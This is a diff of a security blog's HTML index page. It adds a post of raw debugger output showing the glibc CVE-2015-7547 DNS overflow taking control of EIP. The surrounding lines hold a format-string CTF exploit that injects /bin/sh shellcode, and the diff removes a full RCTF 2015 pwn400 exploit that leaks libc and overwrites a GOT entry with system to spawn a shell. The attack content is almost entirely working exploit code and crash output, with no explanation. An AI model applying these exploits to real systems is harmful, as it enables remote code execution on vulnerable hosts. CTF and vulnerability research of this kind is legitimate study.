@@ -202,6 +202,66 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-cve-2015-7547" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/03/29/cve-2015-7547/" class="article-date">
+  	<time datetime="2016-03-29T13:03:18.000Z" itemprop="datePublished">2016-03-29</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/03/29/cve-2015-7547/">cve-2015-7547</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>=&gt; 0x8048573 <main+72>:    call   0x8048420 <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;">&#103;&#x65;&#x74;&#x61;&#100;&#x64;&#114;&#105;&#110;&#x66;&#111;&#x40;&#112;&#108;&#x74;</a><br>=&gt; 0xb7ed9c40 <__gi_getaddrinfo>:    push   ebp<br>Breakpoint 1, __GI_getaddrinfo (name=0x8048643 “bigtang.org”,<br>    service=0x8048640 “22”, hints=0xbffff04c, pai=0xbffff044)<br>    at ../sysdeps/posix/getaddrinfo.c:2323</__gi_getaddrinfo></main+72></p>
+<p>=&gt; 0xb7ed9d23 <__gi_getaddrinfo+227>:    call   0xb7ed7470 <gaih_inet><br>=&gt; 0xb7ed7470 <gaih_inet>:    push   ebp<br>Breakpoint 2, gaih_inet (name=0x8048643 “bigtang.org”, service=0xbfffef80,<br>    req=0xbffff04c, pai=0xbfffef70, naddrs=0xbfffef7c)<br>    at ../sysdeps/posix/getaddrinfo.c:275</gaih_inet></gaih_inet></__gi_getaddrinfo+227></p>
+<p>=&gt; 0xb7ed80c7 <gaih_inet+3159>:    call   edi<br>=&gt; 0xb7def4d0 <_nss_dns_gethostbyname4_r>:    push   ebp<br>_nss_dns_gethostbyname4_r (name=0x8048643 “bigtang.org”, pat=0xbfffeecc,<br>    buffer=0xbfffe9e0 “\377\002”, buflen=0x420, errnop=0xbfffeed0,<br>    herrnop=0xbfffeedc, ttlp=0x0) at nss_dns/dns-host.c:284</_nss_dns_gethostbyname4_r></gaih_inet+3159></p>
+<p>=&gt; 0xb7def58b <_nss_dns_gethostbyname4_r+187>:    call   0xb7dedb70 <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;">&#x5f;&#x5f;&#108;&#105;&#98;&#x63;&#95;&#x72;&#101;&#115;&#x5f;&#x6e;&#x73;&#x65;&#97;&#114;&#99;&#104;&#x40;&#x70;&#x6c;&#x74;</a><br>=&gt; 0xb7ddb240 <__gi___libc_res_nsearch>:    push   ebp<br><strong>GI_</strong>libc_res_nsearch (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:342</_res></__gi___libc_res_nsearch></_nss_dns_gethostbyname4_r+187></p>
+<p>=&gt; 0xb7ddb4c6 <__gi___libc_res_nsearch+646>:<br>    call   0xb7ddaeb0 <__libc_res_nquerydomain><br>=&gt; 0xb7ddaeb0 <__libc_res_nquerydomain>:    push   ebp<br>__libc_res_nquerydomain (statp=statp@entry=0xb7fc1340 <_res>,<br>    name=name@entry=0x8048643 “bigtang.org”, domain=0x0, class=0x1,<br>    type=0xf371, answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”,<br>    anslen=0x800, answerp=0xbfffe97c, answerp2=0xbfffe980,<br>    nanswerp2=0xbfffe984, resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c)<br>    at res_query.c:563</_res></__libc_res_nquerydomain></__libc_res_nquerydomain></__gi___libc_res_nsearch+646></p>
+<p>=&gt; 0xb7ddaf9c <__libc_res_nquerydomain+236>:<br>    call   0xb7dda7f0 <__gi___libc_res_nquery><br>=&gt; 0xb7dda7f0 <__gi___libc_res_nquery>:    push   ebp<br><strong>GI_</strong>libc_res_nquery (statp=0xb7fc1340 <_res>, name=0x8048643 “bigtang.org”,<br>    class=0x1, type=0xf371,<br>    answer=0xbfffe150 “\207C\371VcX\276\070\363\004\016”, anslen=0x800,<br>    answerp=0xbfffe97c, answerp2=0xbfffe980, nanswerp2=0xbfffe984,<br>    resplen2=0xbfffe988, answerp2_malloced=0xbfffe98c) at res_query.c:124<br>124    in res_query.c</_res></__gi___libc_res_nquery></__gi___libc_res_nquery></__libc_res_nquerydomain+236></p>
+<p>=&gt; 0xb7dda969 <__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3]<br>EAX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (‘B’ <repeats 200="" times="">…)<br>EDX: 0x42424242 (‘BBBB’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x16b04<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></repeats></repeats></__gi___libc_res_nquery+377></p>
+<p>EAX: 0xbfffe980 (“fA;5A;”…)<br>EBX: 0xb7dea000 –&gt; 0x14ed4<br>ECX: 0xbfffe980 (“fA;5A;”…)<br>EDX: 0x353b4166 (‘fA;5’)<br>ESI: 0xb7fc1340 –&gt; 0x5<br>EDI: 0x3b414a3b (‘;JA;’)<br>EBP: 0xbfffd7f8 –&gt; 0x0<br>ESP: 0xbfffd550 –&gt; 0x11035<br>EIP: 0xb7dda969 (<__gi___libc_res_nquery+377>:    movzx  ecx,BYTE PTR [edi+0x3])</__gi___libc_res_nquery+377></p>
+<p>0x353b4166  2090 0x3b414a3b  2094</p>
+<p>EAX: 0x0<br>EBX: 0x42424242 (‘BBBB’)<br>ECX: 0xb7fbe858 –&gt; 0x804b000 –&gt; 0x0<br>EDX: 0x0<br>ESI: 0x42424242 (‘BBBB’)<br>EDI: 0x42424242 (‘BBBB’)<br>EBP: 0x42424242 (‘BBBB’)<br>ESP: 0xbfffe9c0 –&gt; 0x8044242<br>EIP: 0x42424242 (‘BBBB’)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[————————————-code————————————-]<br>Invalid $PC address: 0x42424242<br>[————————————stack————————————-]<br>0000| 0xbfffe9c0 –&gt; 0x8044242<br>0004| 0xbfffe9c4 –&gt; 0xbfffeecc –&gt; 0xbfffee10 –&gt; 0x0<br>0008| 0xbfffe9c8 –&gt; 0xbfffe9e0 –&gt; 0x2ff<br>0012| 0xbfffe9cc –&gt; 0x420<br>0016| 0xbfffe9d0 –&gt; 0xbfffeed0 –&gt; 0xb (‘\x0b’)<br>0020| 0xbfffe9d4 –&gt; 0xbfffeedc –&gt; 0x2<br>0024| 0xbfffe9d8 –&gt; 0x0<br>0028| 0xbfffe9dc –&gt; 0x0<br>[——————————————————————————]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x42424242 in ?? ()</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-BCTF-2016-ruin" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -672,60 +732,6 @@
 <p>Download: <a href="http://bigtang.org/files/ebp_a96f7231ab81e1b0d7fe24d660def25a.elf">ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</a></p>
 </blockquote>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>6a<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>58<span class="tag">\<span class="name">x</span></span>99<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>2f"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>73<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>2f<span class="tag">\<span class="name">x</span></span>62<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>6e<span class="tag">\<span class="name">x</span></span>54"</span><br><span class="line">        "<span class="tag">\<span class="name">x</span></span>5b<span class="tag">\<span class="name">x</span></span>52<span class="tag">\<span class="name">x</span></span>53<span class="tag">\<span class="name">x</span></span>54<span class="tag">\<span class="name">x</span></span>59<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>34"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io = zio(('127.0.0.1',2333),timeout=2333)</span><br><span class="line">#raw_input()</span><br><span class="line">io.writeline("<span class="comment">%4$x")</span></span><br><span class="line">ebp = (int(io.read(8),16)-0x1c) &amp; 0xffff</span><br><span class="line">print "[+] Leaked Address: ", hex(ebp)</span><br><span class="line"></span><br><span class="line">io.writeline("<span class="comment">%"+str(ebp)+"x%4$hn")</span></span><br><span class="line">io.writeline(shellcode+"<span class="comment">%"+str(0xa480-len(shellcode))+"x%"+str(12)+"$hn")</span></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-RCTF-2015-Quals-pwn400" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/11/17/RCTF-2015-Quals-pwn400/" class="article-date">
-  	<time datetime="2015-11-17T07:55:21.000Z" itemprop="datePublished">2015-11-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/11/17/RCTF-2015-Quals-pwn400/">RCTF_2015_Quals_pwn400</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>Download: <a href="http://bigtang.org/files/shaxian_51f320b11793463ecdcfbb0c015cc273">shaxian_51f320b11793463ecdcfbb0c015cc273</a></p>
-</blockquote>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line">#<span class="built_in">io</span> = zio((host,port),timeout=<span class="number">100000</span>,print_read=COLORED(REPR,<span class="string">"yellow"</span>),\</span><br><span class="line">#	print_write=COLORED(REPR,<span class="string">"red"</span>))</span><br><span class="line"><span class="built_in">io</span> = zio((host,port),timeout=<span class="number">5</span>,print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line">#raw_input()</span><br><span class="line"></span><br><span class="line">def order(s,how=<span class="string">'32'</span>):</span><br><span class="line">	global <span class="built_in">io</span></span><br><span class="line">	<span class="built_in">io</span>.read_until(<span class="string">'choose:\n'</span>)</span><br><span class="line">	<span class="built_in">io</span>.writeline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="built_in">io</span>.read_until(<span class="string">'5.Jianjiao\n'</span>)</span><br><span class="line">	<span class="built_in">io</span>.writeline(s)</span><br><span class="line">	<span class="built_in">io</span>.read_until(<span class="string">'How many?\n'</span>)</span><br><span class="line">	<span class="built_in">io</span>.writeline(how)</span><br><span class="line"></span><br><span class="line">got_puts      = <span class="number">0x804b02c</span></span><br><span class="line">got_atoi      = <span class="number">0x804b038</span></span><br><span class="line">offset_puts   = <span class="number">0x0064d20</span></span><br><span class="line">offset_atoi   = <span class="number">0x002f7f0</span></span><br><span class="line">offset_system = <span class="number">0x003e360</span></span><br><span class="line"></span><br><span class="line"># message</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'Your Address:\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(l32(<span class="number">0</span>)+l32(<span class="number">0x31</span>))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'Your Phone number:\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(l32(<span class="number">0</span>)*<span class="number">60</span>+l32(<span class="number">0</span>)+l32(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"># Leak libc</span><br><span class="line">order(<span class="string">'a'</span>*<span class="number">28</span>+<span class="string">'\x00'</span>*<span class="number">4</span>+l32(got_puts))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'choose:\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'4'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'-'</span>)</span><br><span class="line">libc_base = <span class="number">0xffffffff</span>-int(<span class="built_in">io</span>.read(<span class="number">9</span>))+<span class="number">1</span>-offset_puts</span><br><span class="line"><span class="built_in">print</span> <span class="string">'[ Libc is ] '</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">order(<span class="string">'b'</span>*<span class="number">28</span>+<span class="string">'\x00'</span>*<span class="number">4</span>+l32(<span class="number">0x804b1b8</span>))</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'choose:\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'2'</span>)</span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'choose:\n'</span>)</span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base+offset_system<span class="number">-0xffffffff</span><span class="number">-1</span></span><br><span class="line">order(l32(<span class="number">0</span>)+l32(got_atoi),how=str(system))</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.read_until(<span class="string">'choose:\n'</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'Enjoy your shell~!'</span></span><br><span class="line"><span class="built_in">io</span>.writeline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="built_in">io</span>.interact()</span><br></pre></td></tr></table></figure>
 
       
     </div>
